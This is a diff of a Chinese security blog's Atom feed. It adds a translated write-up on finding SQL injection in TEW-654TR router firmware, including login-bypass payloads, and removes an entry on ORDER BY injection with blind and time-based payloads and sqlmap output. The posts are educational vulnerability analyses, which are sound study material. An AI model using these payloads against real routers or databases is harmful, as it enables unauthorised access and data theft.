@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-09-20T02:56:35.000Z</updated>
+  <updated>2016-09-20T08:50:46.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,51 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[逆向路由器固件之SQL注入]]></title>
+    <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
+    <id>http://xdxd.love/2016/09/20/逆向路由器固件之SQL注入/</id>
+    <published>2016-09-20T08:44:34.000Z</published>
+    <updated>2016-09-20T08:50:46.000Z</updated>
+    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="http://www.freebuf.com/vuls/76755.html" target="_blank" rel="external">freebuf</a></p>
+<h2 id="另寻他径">另寻他径</h2><p>在前面的内容中，我们使用TEW-654TR路由器的tftp服务实现了获取目标的管理权限。但是要是tftp没有开放到外网怎么办？另寻他径：在这一篇中会我们来分析一个web应用上的漏洞。</p>
+<p>初步分析</p>
+<p><img src="http://image.3001.net/images/20150831/1441019914573.png" alt=""></p>
+<p>使用代理软件抓登录时候的数据包，可以看到发送的http请求如上图所示。数据发送给了my_cgi.cgi这个脚本。我们分析一下这个文件看看。</p>
+<pre><code>➜  rootfs git:(master) ✗ find . -name my_cgi<span class="class">.cgi</span>
+./usr/bin/my_cgi<span class="class">.cgi</span>
+➜  rootfs git:(master) ✗ file ./usr/bin/my_cgi<span class="class">.cgi</span>
+./usr/bin/my_cgi<span class="class">.cgi</span>: ELF <span class="number">32</span>-bit LSB executable, MIPS, MIPS-II version <span class="number">1</span> (SYSV), dynamically linked (uses shared libs), stripped
+</code></pre><p>通过抓包知道用户在登录页面输入的两个参数分别是’user_name’和’user_pwd’，那么我们在CGI脚本中搜索这两个字符串看看。</p>
+<p><img src="http://image.3001.net/images/20150831/14410199362768.png" alt="my_cgi_login2.png
+"></p>
+<p>有几行字符串看起来是SQL查询的语句，尤其是：</p>
+<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'%s'</span> <span class="keyword">and</span> user_pwd=<span class="string">'%s'</span></span>
+</code></pre><p>看起来应该是根据用户名和密码去数据库查询，看密码是否正确。上一篇文章的分析我们可以知道，这个路由器是使用SQLite做数据库存储密码的。</p>
+<p>使用IDA载入my_cgi.cgi。查询”select level from user where user_name“字符串，可以定位到do_login函数。</p>
+<p><img src="http://image.3001.net/images/20150831/14410200092005.png" alt="my_cgi_login3.png"></p>
+<h2 id="假设&amp;猜想">假设&amp;猜想</h2><p>用户提交的用户名和密码大概是传递给sprintf函数生成SQL语句。存储在sql变量中，最后进入exec_sql函数。看起来这个过程没有对数据进行转义。除非数据在进入do_login函数之前或者在exec_sql中有做转义，不然很可能存在SQL注入的漏洞。如果我们的假设是正确的，数据没有经过处理进入了SQL语句中，那么我们可以使用最传统的万能密码来绕过登录验证：</p>
+<pre><code><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>
+</code></pre><p>最后执行的sql就会变成</p>
+<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'admin'</span> <span class="keyword">and</span> user_pwd=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span>
+</code></pre><p>这样查询语句就会返回成功的结果。</p>
+<h2 id="验证猜想">验证猜想</h2><p>我们实验一下：</p>
+<p><img src="http://image.3001.net/images/20150831/14410200328237.png" alt="my_cgi_login4.png"></p>
+<p>果然跟我们预期的一样。这里需要注意的是能够以管理员身份登陆是需要一定运气的。我们构造的SQL语句where条件是or 1=1所以会返回所有的数据。恰好管理员的记录是第一条所以以管理员的身份登陆了。如果第一条是一个普通用户的数据，那么就会以普通用户的身份登陆了。为了确保一定以管理员身份登陆，可以构造如下语句：</p>
+<pre><code>' or level = (<span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">level</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">/*</span></span>
+</code></pre><p>上面这个语句可以确保最后查询出来的数据室level最高的用户的数据。</p>
+<p>这次我们终于看到了逆向分析的冰山一角。下一篇将会讨论使用Qemu虚拟机运行路由器固件，动态调试相关的内容。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="]]>
+    </summary>
+    
+      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[mips架构缓冲区溢出学习二]]></title>
@@ -991,91 +1036,6 @@ echo <span class="string">"Array parameter is missing"</span>;
     </summary>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[order by注入点利用方式分析]]></title>
-    <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
-    <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
-    <published>2016-03-07T02:00:56.000Z</published>
-    <updated>2016-03-08T07:58:08.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为：</p>
-<pre><code>error_reporting(<span class="number">0</span>);
-<span class="variable">$id</span>=$_GET[<span class="string">'sort'</span>];  
-<span class="keyword">if</span>(isset(<span class="variable">$id</span>))
-{
-    //logging the connection parameters to a file for analysis.
-    <span class="variable">$fp</span>=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);
-    fwrite(<span class="variable">$fp</span>,<span class="string">'SORT:'</span>.<span class="variable">$id</span>.<span class="string">"\n"</span>);
-    fclose(<span class="variable">$fp</span>);
-    <span class="variable">$sql</span>=<span class="string">"SELECT * FROM users ORDER BY $id"</span>;
-    /* execute multi query */
-    if (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))
-    {
-</code></pre><p>可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入。</p>
-<p><img src="/images/orderby1.png" alt=""></p>
-<p><img src="/images/orderby2.png" alt=""></p>
-<h1 id="利用方式：">利用方式：</h1><p>mysql 5中 select order by的语法如下：</p>
-<pre><code><span class="operator"><span class="keyword">SELECT</span> 
-[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ] 
-  [<span class="keyword">HIGH_PRIORITY</span>] 
-  [<span class="keyword">STRAIGHT_JOIN</span>] 
-  [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>] 
-  [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>] 
-select_expr [, select_expr ...] 
-[<span class="keyword">FROM</span> table_references 
-[<span class="keyword">WHERE</span> where_condition] 
-[<span class="keyword">GROUP</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
-  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]] 
-[<span class="keyword">HAVING</span> where_condition] 
-[<span class="keyword">ORDER</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
-  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...] 
-[<span class="keyword">LIMIT</span> {[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>}] 
-[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)] 
-[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options 
-  | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span> 
-  | <span class="keyword">INTO</span> var_name [, var_name]] 
-[<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span>
-</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于order by 后面不可以跟union。</p>
-<p>比如：</p>
-<pre><code>select id ,rand(<span class="number">0</span>) from requests order by rand() <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span>
-</code></pre><p>会报错，Incorrect usage of UNION and ORDER BY</p>
-<p>所以通常的利用都是使用了一些技巧。</p>
-<h1 id="盲注：">盲注：</h1><h2 id="需要知道字段名">需要知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
-<pre><code>(<span class="operator"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">id</span> <span class="keyword">else</span> price <span class="keyword">end</span>)
-
-<span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
-</code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
-<p>1,基于表达式结果盲注</p>
-<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-07406" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07406</a></p>
-<p>不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</p>
-<h2 id="成熟的利用方式">成熟的利用方式</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
-<pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
-</code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
-<p>payload:</p>
-<pre><code>id,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,(select <span class="number">1</span> from information_schema.tables))
-</code></pre><p>当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</p>
-<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-076151" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-076151</a></p>
-<p>基于 order by rand(true);order by rand(false);返回不同进行盲注<br>payload:rand(ascii(mid(database(),1,1))=109)</p>
-<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-0152570" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0152570</a></p>
-<p>关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</p>
-<p>参考这里的讨论：<a href="http://zone.wooyun.org/content/25733" target="_blank" rel="external">http://zone.wooyun.org/content/25733</a></p>
-<h2 id="sqlmap利用方式">sqlmap利用方式</h2><p>使用level5 risk3</p>
-<pre><code>Parameter: sort (<span class="keyword">GET</span>)
-    Type: <span class="built_in">boolean</span>-based blind
-    Title: MySQL RLIKE <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span>, HAVING, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause
-    Payload: sort=<span class="number">1</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">9644</span>=<span class="number">9644</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))
-    Type: <span class="keyword">AND</span>/<span class="keyword">OR</span> time-based blind
-    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (<span class="keyword">SELECT</span>)
-    Payload: sort=<span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))MVan)
----
-</code></pre><h1 id="思考">思考</h1>]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为]]>
-    </summary>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
